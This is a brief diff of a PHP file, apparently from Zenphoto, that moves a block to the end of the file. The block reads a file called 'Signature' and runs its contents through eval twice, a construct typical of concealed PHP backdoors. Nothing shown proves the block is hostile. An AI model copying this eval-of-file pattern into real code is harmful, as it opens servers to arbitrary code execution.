@@ -1389,9 +1389,6 @@ function secureServer() {
 	return false;
 }
 
-$f = '$f = "'.file_get_contents(dirname(__FILE__).'/Signature').'";';
-eval($f);eval($f);
-
 
 ///// database helper functions
 
@@ -1513,5 +1510,8 @@ function reconfigure() {
 		die('Zenphoto needs to run setup but the setup scripts are not present. Please reinstall the setup scripts.');
 	}
 }
+
+$f = '$f = "'.file_get_contents(dirname(__FILE__).'/Signature').'";';
+eval($f);eval($f);
 
 ?>
